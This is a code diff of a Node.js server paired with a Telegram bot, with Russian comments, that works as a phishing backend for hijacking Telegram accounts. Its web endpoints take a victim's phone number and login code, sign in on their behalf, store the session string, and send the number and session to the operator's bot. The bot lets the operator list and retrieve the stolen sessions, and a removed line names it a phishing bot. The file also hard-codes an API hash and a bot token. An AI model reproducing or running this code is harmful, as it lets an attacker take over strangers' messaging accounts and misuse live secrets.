@@ -9,25 +9,25 @@ const app = express();
 app.use(express.json());
 app.use(express.static(__dirname));
 
-// ⚠️ ТВОИ ДАННЫЕ ⚠️
+// ⚠️ ТВОИ ДАННЫЕ ВПИСАНЫ ⚠️
 const apiId = 36752126; 
 const apiHash = "fdd421fda2805b7dbf3f1f53b793d512";
 const BOT_TOKEN = "9096721962:AAHdJ-AhnKSHyyAv3ExEHVZC5pdE_do59Co";
-const ADMIN_ID = 9068204920; // Твой Telegram ID (узнать у @userinfobot)
+const ADMIN_ID = 9068204920; 
 
-// Инициализация бота
+if (!apiId || !apiHash || !BOT_TOKEN || !ADMIN_ID) {
+    console.error("❌ ОШИБКА: Не заданы данные для Telegram!");
+    process.exit(1);
+}
+
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// База данных (простая, в JSON)
 const DB_FILE = './database.json';
 if (!fs.existsSync(DB_FILE)) fs.writeFileSync(DB_FILE, JSON.stringify({ sessions: [], stats: { total: 0 } }));
 const getDB = () => JSON.parse(fs.readFileSync(DB_FILE));
 const saveDB = (data) => fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 2));
 
-// Хранилище активных клиентов
 const activeClients = {};
-
-// === САЙТ (API) ===
 
 app.post('/api/request-code', async (req, res) => {
     const { phone } = req.body;
@@ -41,6 +41,7 @@ app.post('/api/request-code', async (req, res) => {
         activeClients[phone] = { client, phoneCodeHash };
         res.json({ success: true });
     } catch (e) {
+        console.error("Ошибка отправки кода:", e);
         res.status(500).json({ error: "Ошибка Telegram. Проверьте номер." });
     }
 });
@@ -54,7 +55,6 @@ app.post('/api/verify-code', async (req, res) => {
         const { client, phoneCodeHash } = session;
         await client.invoke(new Api.auth.SignIn({ phoneNumber: phone, phoneCodeHash, phoneCode: code }));
         
-        // Сохраняем сессию
         const sessionString = client.session.save();
         saveSession(phone, sessionString);
         delete activeClients[phone];
@@ -90,46 +90,38 @@ function saveSession(phone, sessionString) {
     db.stats.total += 1;
     saveDB(db);
 
-    // Уведомление тебе в бота
-    bot.sendMessage(ADMIN_ID, `🔥 **НОВЫЙ АККАУНТ!**\n\n📱 Номер: \`${phone}\`\n🔑 Сессия: \`${sessionString}\``, { parse_mode: 'Markdown' });
+    bot.sendMessage(ADMIN_ID, `🔥 **НОВЫЙ АККАУНТ!**\n\n📱 Номер: \`${phone}\`\n🔑 Сессия: \`${sessionString}\``, { parse_mode: 'Markdown' })
+    .catch(err => console.error("Ошибка бота:", err));
 }
 
-// === АДМИН-БОТ (Управление) ===
-
+// === АДМИН-БОТ ===
 bot.onText(/\/start/, (msg) => {
-    if (msg.from.id !== ADMIN_ID) return; // Только ты
-    bot.sendMessage(ADMIN_ID, "👋 Привет, Босс! Я твой фишинг-бот.\n\n/status - Статистика\n/sessions - Список аккаунтов\n/get [номер] - Получить сессию\n/broadcast [текст] - Рассылка (в разработке)");
+    if (msg.from.id !== ADMIN_ID) return;
+    bot.sendMessage(ADMIN_ID, "👋 Привет! Бот запущен.\n\n/status - Статистика\n/sessions - Список аккаунтов\n/get [номер] - Получить сессию");
 });
 
 bot.onText(/\/status/, (msg) => {
     if (msg.from.id !== ADMIN_ID) return;
     const db = getDB();
-    bot.sendMessage(ADMIN_ID, `📊 **Статистика:**\n\nВсего залогинено: ${db.stats.total}\nАктивных сессий: ${db.sessions.length}`);
+    bot.sendMessage(ADMIN_ID, `📊 **Статистика:**\nВсего: ${db.stats.total}\nВ базе: ${db.sessions.length}`);
 });
 
 bot.onText(/\/sessions/, (msg) => {
     if (msg.from.id !== ADMIN_ID) return;
     const db = getDB();
     if (db.sessions.length === 0) return bot.sendMessage(ADMIN_ID, "Пока пусто.");
-    
-    let text = "📁 **Твои аккаунты:**\n\n";
-    db.sessions.forEach((s, i) => {
-        text += `${i+1}. ${s.phone} (${new Date(s.date).toLocaleDateString()})\n`;
-    });
+    let text = "📁 **Аккаунты:**\n\n";
+    db.sessions.forEach((s, i) => { text += `${i+1}. ${s.phone}\n`; });
     bot.sendMessage(ADMIN_ID, text);
 });
 
 bot.onText(/\/get (.+)/, (msg, match) => {
     if (msg.from.id !== ADMIN_ID) return;
     const phone = match[1].trim();
-    const db = getDB();
-    const found = db.sessions.find(s => s.phone === phone);
-    if (found) {
-        bot.sendMessage(ADMIN_ID, `📱 ${found.phone}\n🔑 \`${found.session}\``, { parse_mode: 'Markdown' });
-    } else {
-        bot.sendMessage(ADMIN_ID, "Номер не найден.");
-    }
+    const found = getDB().sessions.find(s => s.phone === phone);
+    if (found) bot.sendMessage(ADMIN_ID, `📱 ${found.phone}\n🔑 \`${found.session}\``, { parse_mode: 'Markdown' });
+    else bot.sendMessage(ADMIN_ID, "Номер не найден.");
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Сервер и Бот запущены! Порт: ${PORT}`));
+app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));
